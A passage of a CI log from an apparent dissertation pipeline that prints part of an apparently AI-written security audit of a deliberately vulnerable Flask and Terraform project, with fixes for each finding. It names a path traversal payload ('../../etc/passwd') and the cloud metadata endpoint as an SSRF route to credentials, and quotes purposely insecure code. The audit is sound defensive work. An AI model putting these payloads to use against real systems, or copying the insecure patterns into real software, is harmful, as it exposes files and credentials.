+2026-08-24T17:59:51.6594526Z This grants full administrative access to all AWS services and resources, violating the principle of least privilege. The subsequent, more specific statements are entirely redundant.
+2026-08-24T17:59:51.6595303Z 
+2026-08-24T17:59:51.6595858Z **Fix:** Remove the wildcard statement and grant only the specific permissions required:
+2026-08-24T17:59:51.6596341Z ```json
+2026-08-24T17:59:51.6596570Z {
+2026-08-24T17:59:51.6596815Z     "Version": "2012-10-17",
+2026-08-24T17:59:51.6597121Z     "Statement": [
+2026-08-24T17:59:51.6597364Z         {
+2026-08-24T17:59:51.6597651Z             "Sid": "AllowEC2Describe",
+2026-08-24T17:59:51.6597955Z             "Effect": "Allow",
+2026-08-24T17:59:51.6598230Z             "Action": [
+2026-08-24T17:59:51.6598502Z                 "ec2:DescribeInstances",
+2026-08-24T17:59:51.6598863Z                 "ec2:DescribeSecurityGroups",
+2026-08-24T17:59:51.6599246Z                 "ec2:DescribeVpcs"
+2026-08-24T17:59:51.6599550Z             ],
+2026-08-24T17:59:51.6599802Z             "Resource": "*"
+2026-08-24T17:59:51.6600092Z         }
+2026-08-24T17:59:51.6600399Z         // ... only other explicitly needed permissions
+2026-08-24T17:59:51.6600763Z     ]
+2026-08-24T17:59:51.6600994Z }
+2026-08-24T17:59:51.6601390Z ```
+2026-08-24T17:59:51.6601521Z 
+2026-08-24T17:59:51.6601624Z ---
+2026-08-24T17:59:51.6602029Z 
+2026-08-24T17:59:51.6602196Z ### 7. Missing Authentication on All Endpoints
+2026-08-24T17:59:51.6602656Z **Files:** `./app/routes/users.py`, `./app/routes/files.py`
+2026-08-24T17:59:51.6603100Z **Severity:** High
+2026-08-24T17:59:51.6603294Z 
+2026-08-24T17:59:51.6603383Z ```python
+2026-08-24T17:59:51.6603700Z # No authentication decorator on any route
+2026-08-24T17:59:51.6604119Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:59:51.6604473Z def delete_user(username):
+2026-08-24T17:59:51.6604757Z     ...  # Anyone can delete any user
+2026-08-24T17:59:51.6604950Z 
+2026-08-24T17:59:51.6605218Z @files_bp.route("/delete/<int:file_id>", methods=["DELETE"])
+2026-08-24T17:59:51.6605508Z def delete_file(file_id):
+2026-08-24T17:59:51.6605723Z     ...  # Anyone can delete any file
+2026-08-24T17:59:51.6605938Z ```
+2026-08-24T17:59:51.6606034Z 
+2026-08-24T17:59:51.6606232Z All endpoints are publicly accessible with no authentication or authorisation checks.
+2026-08-24T17:59:51.6606517Z 
+2026-08-24T17:59:51.6606696Z **Fix:** Implement a JWT verification decorator and apply it to protected routes:
+2026-08-24T17:59:51.6607024Z ```python
+2026-08-24T17:59:51.6607209Z from functools import wraps
+2026-08-24T17:59:51.6607414Z import jwt
+2026-08-24T17:59:51.6607602Z from flask import request, jsonify
+2026-08-24T17:59:51.6607753Z 
+2026-08-24T17:59:51.6607833Z def require_auth(f):
+2026-08-24T17:59:51.6608020Z     @wraps(f)
+2026-08-24T17:59:51.6608219Z     def decorated(*args, **kwargs):
+2026-08-24T17:59:51.6608542Z         token = request.headers.get("Authorization", "").replace("Bearer ", "")
+2026-08-24T17:59:51.6608855Z         if not token:
+2026-08-24T17:59:51.6609083Z             return jsonify({"error": "Unauthorised"}), 401
+2026-08-24T17:59:51.6609339Z         try:
+2026-08-24T17:59:51.6609637Z             payload = jwt.decode(token, os.environ.get("JWT_SECRET_KEY"), algorithms=["HS256"])
+2026-08-24T17:59:51.6610015Z             request.user_id = payload["user_id"]
+2026-08-24T17:59:51.6610280Z         except jwt.ExpiredSignatureError:
+2026-08-24T17:59:51.6610556Z             return jsonify({"error": "Token expired"}), 401
+2026-08-24T17:59:51.6610830Z         except jwt.InvalidTokenError:
+2026-08-24T17:59:51.6611087Z             return jsonify({"error": "Invalid token"}), 401
+2026-08-24T17:59:51.6611345Z         return f(*args, **kwargs)
+2026-08-24T17:59:51.6611565Z     return decorated
+2026-08-24T17:59:51.6611849Z 
+2026-08-24T17:59:51.6612013Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:59:51.6612280Z @require_auth
+2026-08-24T17:59:51.6612471Z def delete_user(username):
+2026-08-24T17:59:51.6612670Z     ...
+2026-08-24T17:59:51.6612834Z ```
+2026-08-24T17:59:51.6612928Z 
+2026-08-24T17:59:51.6613003Z ---
+2026-08-24T17:59:51.6613092Z 
+2026-08-24T17:59:51.6613207Z ### 8. IMDS v1 Enabled on EC2 Instance (SSRF Risk)
+2026-08-24T17:59:51.6613469Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:59:51.6613692Z **Severity:** High
+2026-08-24T17:59:51.6613805Z 
+2026-08-24T17:59:51.6614010Z ```hcl
+2026-08-24T17:59:51.6614189Z metadata_options {
+2026-08-24T17:59:51.6614384Z     http_endpoint               = "enabled"
+2026-08-24T17:59:51.6614650Z     http_tokens                 = "optional"  # Allows IMDSv1
+2026-08-24T17:59:51.6614914Z     http_put_response_hop_limit = 1
+2026-08-24T17:59:51.6615117Z }
+2026-08-24T17:59:51.6615263Z ```
+2026-08-24T17:59:51.6615346Z 
+2026-08-24T17:59:51.6615929Z `http_tokens = "optional"` permits IMDSv1, which does not require a session token. If the application is vulnerable to SSRF, an attacker can reach `http://169.254.169.254/` and retrieve IAM credentials without any additional authentication step.
+2026-08-24T17:59:51.6616578Z 
+2026-08-24T17:59:51.6616660Z **Fix:** Enforce IMDSv2:
+2026-08-24T17:59:51.6616842Z ```hcl
+2026-08-24T17:59:51.6617001Z metadata_options {
+2026-08-24T17:59:51.6617195Z     http_endpoint               = "enabled"
+2026-08-24T17:59:51.6617517Z     http_tokens                 = "required"  # IMDSv2 only
+2026-08-24T17:59:51.6617781Z     http_put_response_hop_limit = 1
+2026-08-24T17:59:51.6617987Z }
+2026-08-24T17:59:51.6618127Z ```
+2026-08-24T17:59:51.6618206Z 
+2026-08-24T17:59:51.6618275Z ---
+2026-08-24T17:59:51.6618358Z 
+2026-08-24T17:59:51.6618444Z ### 9. Publicly Accessible S3 Bucket
+2026-08-24T17:59:51.6618668Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:59:51.6618873Z **Severity:** High
+2026-08-24T17:59:51.6618975Z 
+2026-08-24T17:59:51.6619038Z ```hcl
+2026-08-24T17:59:51.6619274Z resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+2026-08-24T17:59:51.6619564Z     block_public_acls       = false
+2026-08-24T17:59:51.6619776Z     block_public_policy     = false
+2026-08-24T17:59:51.6619986Z     ignore_public_acls      = false
+2026-08-24T17:59:51.6620193Z     restrict_public_buckets = false
+2026-08-24T17:59:51.6620402Z }
+2026-08-24T17:59:51.6620552Z ```
+2026-08-24T17:59:51.6620630Z 
+2026-08-24T17:59:51.6620904Z All four public access block settings are disabled, making the bucket and its contents potentially world-readable.
+2026-08-24T17:59:51.6621241Z 
+2026-08-24T17:59:51.6621479Z **Fix:** Unless serving a static public website with intentionally public content, enable all four settings:
+2026-08-24T17:59:51.6622353Z ```hcl
+2026-08-24T17:59:51.6622601Z resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+2026-08-24T17:59:51.6622899Z     block_public_acls       = true
+2026-08-24T17:59:51.6623114Z     block_public_policy     = true
+2026-08-24T17:59:51.6623327Z     ignore_public_acls      = true
+2026-08-24T17:59:51.6623555Z     restrict_public_buckets = true
+2026-08-24T17:59:51.6623775Z }
+2026-08-24T17:59:51.6623943Z ```
+2026-08-24T17:59:51.6624029Z 
+2026-08-24T17:59:51.6624106Z ---
+2026-08-24T17:59:51.6624191Z 
+2026-08-24T17:59:51.6624287Z ### 10. Unencrypted S3 Bucket
+2026-08-24T17:59:51.6624516Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:59:51.6624740Z **Severity:** High
+2026-08-24T17:59:51.6624860Z 
+2026-08-24T17:59:51.6624927Z ```hcl
+2026-08-24T17:59:51.6625135Z resource "aws_s3_bucket" "unencrypted_bucket" {
+2026-08-24T17:59:51.6625416Z     bucket = "dissertation-unencrypted-bucket"
+2026-08-24T17:59:51.6625657Z }
+2026-08-24T17:59:51.6625846Z # No encryption configuration attached
+2026-08-24T17:59:51.6626067Z ```
+2026-08-24T17:59:51.6626154Z 
+2026-08-24T17:59:51.6626398Z Data at rest is stored without encryption, violating most compliance frameworks (PCI-DSS, HIPAA, GDPR).
+2026-08-24T17:59:51.6626707Z 
+2026-08-24T17:59:51.6626786Z **Fix:**
+2026-08-24T17:59:51.6626951Z ```hcl
+2026-08-24T17:59:51.6627262Z resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+2026-08-24T17:59:51.6627658Z     bucket = aws_s3_bucket.unencrypted_bucket.id
+2026-08-24T17:59:51.6627896Z     rule {
+2026-08-24T17:59:51.6628098Z         apply_server_side_encryption_by_default {
+2026-08-24T17:59:51.6628432Z             sse_algorithm = "aws:kms"  # Prefer KMS over AES256 for key management
+2026-08-24T17:59:51.6628736Z         }
+2026-08-24T17:59:51.6628894Z     }
+2026-08-24T17:59:51.6629124Z }
+2026-08-24T17:59:51.6629270Z ```
+2026-08-24T17:59:51.6629353Z 
+2026-08-24T17:59:51.6629416Z ---
+2026-08-24T17:59:51.6629511Z 
+2026-08-24T17:59:51.6629604Z ## Medium Severity Vulnerabilities
+2026-08-24T17:59:51.6629740Z 
+2026-08-24T17:59:51.6629807Z ---
+2026-08-24T17:59:51.6629886Z 
+2026-08-24T17:59:51.6630006Z ### 11. Debug Mode Enabled in Production Entry Point
+2026-08-24T17:59:51.6630260Z **File:** `./run.py`
+2026-08-24T17:59:51.6630447Z **Severity:** Medium
+2026-08-24T17:59:51.6630563Z 
+2026-08-24T17:59:51.6630633Z ```python
+2026-08-24T17:59:51.6630807Z app.run(debug=True)
+2026-08-24T17:59:51.6630977Z ```
+2026-08-24T17:59:51.6631055Z 
+2026-08-24T17:59:51.6631564Z Flask's debug mode enables the interactive Werkzeug debugger, which allows arbitrary Python code execution via the browser if an exception occurs. It also enables the auto-reloader and exposes detailed stack traces.
+2026-08-24T17:59:51.6632427Z 
+2026-08-24T17:59:51.6632497Z **Fix:**
+2026-08-24T17:59:51.6632652Z ```python
+2026-08-24T17:59:51.6632830Z if __name__ == "__main__":
+2026-08-24T17:59:51.6633091Z     debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+2026-08-24T17:59:51.6633377Z     app.run(debug=debug)
+2026-08-24T17:59:51.6633562Z ```
+2026-08-24T17:59:51.6633645Z 
+2026-08-24T17:59:51.6633710Z ---
+2026-08-24T17:59:51.6633802Z 
+2026-08-24T17:59:51.6633893Z ### 12. No Input Validation on File Upload
+2026-08-24T17:59:51.6634267Z **File:** `./app/routes/files.py` — `upload_file()`
+2026-08-24T17:59:51.6634511Z **Severity:** Medium
+2026-08-24T17:59:51.6634616Z 
+2026-08-24T17:59:51.6634689Z ```python
+2026-08-24T17:59:51.6634866Z filename = data.get("filename")
+2026-08-24T17:59:51.6635134Z file_record = File(filename=filename, uploaded_by=uploaded_by)
+2026-08-24T17:59:51.6635396Z ```
+2026-08-24T17:59:51.6635484Z 
+2026-08-24T17:59:51.6635940Z No validation is performed on the filename. This enables path traversal payloads (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.
+2026-08-24T17:59:51.6636448Z 
+2026-08-24T17:59:51.6636519Z **Fix:**
+2026-08-24T17:59:51.6636671Z ```python
+2026-08-24T17:59:51.6636825Z import re
+2026-08-24T17:59:51.6636996Z from pathlib import Path
+2026-08-24T17:59:51.6637125Z 
+2026-08-24T17:59:51.6637213Z filename = data.get("filename", "")
+2026-08-24T17:59:51.6637446Z # Sanitise: allow only safe characters
+2026-08-24T17:59:51.6637678Z if not re.match(r'^[\w\-. ]+$', filename):
+2026-08-24T17:59:51.6637935Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:59:51.6638186Z # Prevent path traversal
+2026-08-24T17:59:51.6638448Z filename = Path(filename).name  # Strips any directory components
+2026-08-24T17:59:51.6638714Z ```
+2026-08-24T17:59:51.6638795Z 
+2026-08-24T17:59:51.6638860Z ---
+2026-08-24T17:59:51.6638939Z 
+2026-08-24T17:59:51.6639050Z ### 13. Overly Permissive Secrets Manager IAM Action
+2026-08-24T17:59:51.6639320Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:59:51.6639556Z **Severity:** Medium
+2026-08-24T17:59:51.6639666Z 
+2026-08-24T17:59:51.6639733Z ```json
+2026-08-24T17:59:51.6639891Z {
+2026-08-24T17:59:51.6640059Z     "Sid": "SecretsManagerAccess",
+2026-08-24T17:59:51.6640263Z     "Action": [
+2026-08-24T17:59:51.6640453Z         "secretsmanager:GetSecretValue",
+2026-08-24T17:59:51.6640686Z         "secretsmanager:ListSecrets",
+2026-08-24T17:59:51.6640948Z         "secretsmanager:DeleteSecret"  // Destructive action
+2026-08-24T17:59:51.6641204Z     ],
+2026-08-24T17:59:51.6641366Z     "Resource": "*"  // All secrets
+2026-08-24T17:59:51.6641561Z }
+2026-08-24T17:59:51.6641851Z ```
+2026-08-24T17:59:51.6642065Z 
+2026-08-24T17:59:51.6642414Z `DeleteSecret` on `Resource: "*"` allows the principal to delete any secret in the account. `ListSecrets` on `*` also reveals the existence of all secrets.
+2026-08-24T17:59:51.6642825Z 
+2026-08-24T17:59:51.6642890Z **Fix:**
+2026-08-24T17:59:51.6643050Z ```json
+2026-08-24T17:59:51.6643212Z {
+2026-08-24T17:59:51.6643396Z     "Sid": "SecretsManagerAccess",
+2026-08-24T17:59:51.6643728Z     "Effect": "Allow",
+2026-08-24T17:59:51.6643905Z     "Action": [
+2026-08-24T17:59:51.6644088Z         "secretsmanager:GetSecretValue"
+2026-08-24T17:59:51.6644300Z     ],
+2026-08-24T17:59:51.6644564Z     "Resource": "arn:aws:secretsmanager:eu-west-2:ACCOUNT_ID:secret:dissertation/*"
+2026-08-24T17:59:51.6644875Z }
+2026-08-24T17:59:51.6645029Z ```
+2026-08-24T17:59:51.6645119Z 
+2026-08-24T17:59:51.6645184Z ---
+2026-08-24T17:59:51.6645274Z 
+2026-08-24T17:59:51.6645366Z ### 14. No Input Validation on Registration
+2026-08-24T17:59:51.6645683Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:59:51.6645914Z **Severity:** Medium
+2026-08-24T17:59:51.6646017Z 
+2026-08-24T17:59:51.6646087Z ```python
+2026-08-24T17:59:51.6646255Z data = request.get_json()
+2026-08-24T17:59:51.6646452Z username = data.get("username")
+2026-08-24T17:59:51.6646666Z password = data.get("password")
+2026-08-24T17:59:51.6646872Z email = data.get("email")
+2026-08-24T17:59:51.6647167Z # No null checks, no length limits, no format validation
+2026-08-24T17:59:51.6647640Z user = User(username=username, *** email=email)
+2026-08-24T17:59:51.6647868Z ```
+2026-08-24T17:59:51.6647956Z 
+2026-08-24T17:59:51.6648247Z Missing validation allows null values, excessively long strings (potential DoS), and malformed email addresses to be stored.
+2026-08-24T17:59:51.6648611Z 
+2026-08-24T17:59:51.6648682Z **Fix:**
+2026-08-24T17:59:51.6648840Z ```python
+2026-08-24T17:59:51.6649028Z if not username or not password or not email:
+2026-08-24T17:59:51.6649338Z     return jsonify({"error": "All fields are required"}), 400
+2026-08-24T17:59:51.6649601Z if len(password) < 12:
+2026-08-24T17:59:51.6649876Z     return jsonify({"error": "Password must be at least 12 characters"}), 400
+2026-08-24T17:59:51.6650197Z if len(username) > 80 or len(email) > 120:
+2026-08-24T17:59:51.6650450Z     return jsonify({"error": "Input too long"}), 400
+2026-08-24T17:59:51.6650690Z import re
+2026-08-24T17:59:51.6650882Z if not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
+2026-08-24T17:59:51.6651157Z     return jsonify({"error": "Invalid email format"}), 400
+2026-08-24T17:59:51.6651403Z ```
+2026-08-24T17:59:51.6651492Z 
+2026-08-24T17:59:51.6651559Z ---
+2026-08-24T17:59:51.6651638Z 
+2026-08-24T17:59:51.6651891Z ### 15. Unauthenticated User Enumeration
+2026-08-24T17:59:51.6652145Z **File:** `./app/routes/users.py`
+2026-08-24T17:59:51.6652353Z **Severity:** Medium
+2026-08-24T17:59:51.6652459Z 
+2026-08-24T17:59:51.6652527Z ```python
+2026-08-24T17:59:51.6652717Z @users_bp.route("/<username>", methods=["GET"])
+2026-08-24T17:59:51.6652964Z def get_user(username):
+2026-08-24T17:59:51.6653156Z     ...
+2026-08-24T17:59:51.6653377Z     return jsonify({"id": user.id, "username": user.username,
+2026-08-24T17:59:51.6653683Z                     "email": user.email, "role": user.role}), 200
+2026-08-24T17:59:51.6653867Z 
+2026-08-24T17:59:51.6653959Z @users_bp.route("/", methods=["GET"])
+2026-08-24T17:59:51.6654189Z def get_all_users():
+2026-08-24T17:59:51.6654392Z     users = User.query.all()
+2026-08-24T17:59:51.6654591Z     ...
+2026-08-24T17:59:51.6654745Z ```
+2026-08-24T17:59:51.6654834Z 
+2026-08-24T17:59:51.6655184Z Any unauthenticated party can enumerate all usernames, email addresses, and roles, facilitating targeted phishing and privilege escalation attacks.
+2026-08-24T17:59:51.6655604Z 
+2026-08-24T17:59:51.6655855Z **Fix:** Apply `@require_auth` to these routes and limit the fields returned based on the requesting user's role.
+2026-08-24T17:59:51.6656162Z 
+2026-08-24T17:59:51.6656234Z ---
+2026-08-24T17:59:51.6656316Z 
+2026-08-24T17:59:51.6656407Z ## Low Severity Vulnerabilities
+2026-08-24T17:59:51.6656547Z 
+2026-08-24T17:59:51.6656611Z ---
+2026-08-24T17:59:51.6656698Z 
+2026-08-24T17:59:51.6656792Z ### 16. JWT Algorithm Not Validated on Decode
+2026-08-24T17:59:51.6657045Z **File:** `./app/routes/auth.py`
+2026-08-24T17:59:51.6657254Z **Severity:** Low
+2026-08-24T17:59:51.6657355Z 
+2026-08-24T17:59:51.6658116Z The `generate_token` function specifies `HS256`, but there is no corresponding `decode` call in the codebase that explicitly rejects the `none` algorithm or enforces the expected algorithm. If a decode is added later without specifying `algorithms`, it may be vulnerable to the `alg: none` attack.
+2026-08-24T17:59:51.6659295Z 
+2026-08-24T17:59:51.6659431Z **Fix:** Always specify the algorithm explicitly when decoding:
+2026-08-24T17:59:51.6659705Z ```python
+2026-08-24T17:59:51.6659968Z jwt.decode(token, secret, algorithms=["HS256"])  # Never omit algorithms=
+2026-08-24T17:59:51.6660271Z ```
+2026-08-24T17:59:51.6660355Z 
+2026-08-24T17:59:51.6660430Z ---
+2026-08-24T17:59:51.6660522Z 
+2026-08-24T17:59:51.6660642Z ### 17. Sensitive Data Exposure via `get_db_connection()`
+2026-08-24T17:59:51.6660910Z **File:** `./app/routes/auth.py`
+2026-08-24T17:59:51.6661122Z **Severity:** Low
+2026-08-24T17:59:51.6661234Z 
+2026-08-24T17:59:51.6661309Z ```python
+2026-08-24T17:59:51.6661481Z def get_db_connection():
+2026-08-24T17:59:51.6662010Z     db_password = "supersecretdbpassword123"
+2026-08-24T17:59:51.6662264Z     return db_password
+2026-08-24T17:59:51.6662448Z ```
+2026-08-24T17:59:51.6662540Z 
+2026-08-24T17:59:51.6662859Z This function serves no purpose other than returning a hardcoded credential string. It is dead code that increases the attack surface.
+2026-08-24T17:59:51.6663245Z 
+2026-08-24T17:59:51.6663513Z **Fix:** Delete the function entirely and source credentials from environment variables as described in finding #5.
+2026-08-24T17:59:51.6663840Z 
+2026-08-24T17:59:51.6663916Z ---
+2026-08-24T17:59:51.6664005Z 
+2026-08-24T17:59:51.6664094Z ### 18. `datetime.utcnow()` Deprecation
+2026-08-24T17:59:51.6664329Z **File:** `./app/routes/auth.py`
+2026-08-24T17:59:51.6664549Z **Severity:** Low
+2026-08-24T17:59:51.6664653Z 
+2026-08-24T17:59:51.6664727Z ```python
+2026-08-24T17:59:51.6664966Z "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
+2026-08-24T17:59:51.6665247Z ```
+2026-08-24T17:59:51.6665335Z 
+2026-08-24T17:59:51.6665688Z `datetime.utcnow()` is deprecated in Python 3.12+ and returns a naive datetime, which can cause subtle timezone-related bugs in token expiry validation.
+2026-08-24T17:59:51.6666105Z 
+2026-08-24T17:59:51.6666175Z **Fix:**
+2026-08-24T17:59:51.6666346Z ```python
+2026-08-24T17:59:51.6666551Z from datetime import datetime, timezone, timedelta
+2026-08-24T17:59:51.6666855Z "exp": datetime.now(tz=timezone.utc) + timedelta(hours=24)
+2026-08-24T17:59:51.6667122Z ```
+2026-08-24T17:59:51.6667211Z 
+2026-08-24T17:59:51.6667277Z ---
+2026-08-24T17:59:51.6667366Z 
+2026-08-24T17:59:51.6667445Z ## Summary Table
+2026-08-24T17:59:51.6667550Z 
+2026-08-24T17:59:51.6667639Z | # | File | Issue | Severity |
+2026-08-24T17:59:51.6667852Z |---|------|-------|----------|
+2026-08-24T17:59:51.6668062Z | 1 | `auth.py` | SQL Injection
+2026-08-24T17:59:51.6668197Z 
+2026-08-24T17:59:51.6668280Z === ALL RUNS COMPLETE ===
+2026-08-24T17:59:51.6668477Z Total runs: 5
+2026-08-24T17:59:51.6982672Z Node 20 is being deprecated. This workflow is running with Node 24 by default. If you need to temporarily use Node 20, you can set the ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true environment variable. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
+2026-08-24T17:59:51.6983669Z ##[group]Run actions/upload-artifact@v4
+2026-08-24T17:59:51.6983901Z with:
+2026-08-24T17:59:51.6984085Z   name: claude-neutral-results
+2026-08-24T17:59:51.6984310Z   path: claude_neutral_results.txt
+2026-08-24T17:59:51.6984538Z   if-no-files-found: warn
+2026-08-24T17:59:51.6984752Z   compression-level: 6
+2026-08-24T17:59:51.6984946Z   overwrite: false
+2026-08-24T17:59:51.6985139Z   include-hidden-files: false
+2026-08-24T17:59:51.6985343Z env:
+2026-08-24T17:59:51.6985564Z   pythonLocation: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:59:51.6985916Z   PKG_CONFIG_PATH: /opt/hostedtoolcache/Python/3.10.21/x64/lib/pkgconfig
+2026-08-24T17:59:51.6986294Z   Python_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:59:51.6986599Z   Python2_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:59:51.6986904Z   Python3_ROOT_DIR: /opt/hostedtoolcache/Python/3.10.21/x64
+2026-08-24T17:59:51.6987223Z   LD_LIBRARY_PATH: /opt/hostedtoolcache/Python/3.10.21/x64/lib
+2026-08-24T17:59:51.6987501Z ##[endgroup]
+2026-08-24T17:59:51.8371877Z (node:2185) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-08-24T17:59:51.8372479Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-08-24T17:59:51.8409173Z With the provided path, there will be 1 file uploaded
+2026-08-24T17:59:51.8415033Z Artifact name is valid!
+2026-08-24T17:59:51.8415637Z Root directory input is valid!
+2026-08-24T17:59:52.1771492Z Beginning upload of artifact content to blob storage
+2026-08-24T17:59:52.1939979Z (node:2185) [DEP0169] DeprecationWarning: `url.parse()` behavior is not standardized and prone to errors that have security implications. Use the WHATWG URL API instead. CVEs are not issued for `url.parse()` vulnerabilities.
+2026-08-24T17:59:52.4871418Z Uploaded bytes 13352
+2026-08-24T17:59:52.5523764Z Finished uploading artifact content to blob storage!
+2026-08-24T17:59:52.5524483Z SHA256 digest of uploaded artifact zip is 856bb1a74c6683d87e6a0dc3f68b4f83c7eb9c61d8ada6de0cabb0a02015e4b4
+2026-08-24T17:59:52.5526942Z Finalizing artifact upload
+2026-08-24T17:59:52.7802722Z Artifact claude-neutral-results.zip successfully finalized. Artifact ID 9532223999
+2026-08-24T17:59:52.7803924Z Artifact claude-neutral-results has been successfully uploaded! Final size is 13352 bytes. Artifact ID is 9532223999
+2026-08-24T17:59:52.7805107Z Artifact download URL: https://github.com/WillKirk/dissertation-pipeline/actions/runs/32759338293/artifacts/9532223999
+2026-08-24T17:59:52.7953887Z Node 20 is being deprecated. This workflow is running with Node 24 by default. If you need to temporarily use Node 20, you can set the ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true environment variable. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
+2026-08-24T17:59:52.7955016Z Post job cleanup.
+2026-08-24T17:59:52.9156459Z (node:2198) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-08-24T17:59:52.9157645Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-08-24T17:59:52.9327451Z Node 20 is being deprecated. This workflow is running with Node 24 by default. If you need to temporarily use Node 20, you can set the ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true environment variable. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
+2026-08-24T17:59:52.9329389Z Post job cleanup.
+2026-08-24T17:59:52.9990104Z (node:2206) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
+2026-08-24T17:59:52.9991051Z (Use `node --trace-deprecation ...` to show where the warning was created)
+2026-08-24T17:59:53.0016990Z [command]/usr/bin/git version
+2026-08-24T17:59:53.0046788Z git version 2.55.0
+2026-08-24T17:59:53.0077645Z Temporarily overriding HOME='/home/runner/work/_temp/11450b28-02ea-426b-88d9-d1c4008cea6f' before making global git config changes
+2026-08-24T17:59:53.0078800Z Adding repository directory to the temporary git global config as a safe directory
+2026-08-24T17:59:53.0082917Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/dissertation-pipeline/dissertation-pipeline
+2026-08-24T17:59:53.0111950Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-08-24T17:59:53.0139315Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-08-24T17:59:53.0314609Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-08-24T17:59:53.0334931Z http.https://github.com/.extraheader
+2026-08-24T17:59:53.0342531Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
+2026-08-24T17:59:53.0366161Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-08-24T17:59:53.0639261Z Cleaning up orphan processes
+2026-08-24T17:59:53.0908988Z ##[warning]Node.js 20 is deprecated. The following actions target Node.js 20 but are being forced to run on Node.js 24: actions/checkout@v3, actions/setup-python@v4, actions/upload-artifact@v4. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
